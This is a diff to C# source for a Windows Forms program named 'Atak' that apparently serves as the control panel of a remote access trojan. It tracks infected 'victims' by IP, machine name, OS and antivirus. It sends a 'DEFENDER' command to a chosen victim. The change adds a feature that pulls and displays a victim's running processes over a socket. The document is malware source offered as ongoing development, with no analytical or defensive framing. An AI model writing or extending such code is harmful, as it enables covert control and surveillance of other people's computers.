@@ -69,6 +69,7 @@ namespace Atak
             {
             }
         }
+        int pNum = 0;
         void clientGetResult(IAsyncResult res)
         {
             try
@@ -94,12 +95,25 @@ namespace Atak
                         }
                         GC.Collect();
                         break;
+                    case "PPPNUM":
+                        CheckForIllegalCrossThreadCalls = false;
+                        pNum = Convert.ToInt32(sData[1]);
+                        break;
+                    case "PPP":
+                        for (int i = 1; i <= pNum; i++) //TODO : FIX RESPONSE AND ADD LISTVIEW
+                        {
+                            ListViewItem item = new ListViewItem(sData[i * 2 - 1]);
+                            item.SubItems.Add(sData[i * 2]);
+                            ((Processes)(Application.OpenForms["Processes"])).listView1.Items.Add(item);
+                        }
+                        break;
                 }
 
                 socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(clientGetResult), socket);
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                MessageBox.Show(ex.Message);
             }
         }
         public delegate void _clientLogon(Socket _socket, string _id, string _machineName, string _ip, string _os, string _anti);
@@ -204,6 +218,17 @@ namespace Atak
                 if (victim.ip == VictimsListView.SelectedItems[0].Text)
                 {
                     victim.socket.Send(Encoding.UTF8.GetBytes("DEFENDER"));
+                }
+            }
+        }
+        private void getProcessesToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Victims victim in victimList)
+            {
+                if (victim.ip == VictimsListView.SelectedItems[0].Text)
+                {
+                    Processes processes = new Processes(victim.socket);
+                    processes.Show();
                 }
             }
         }
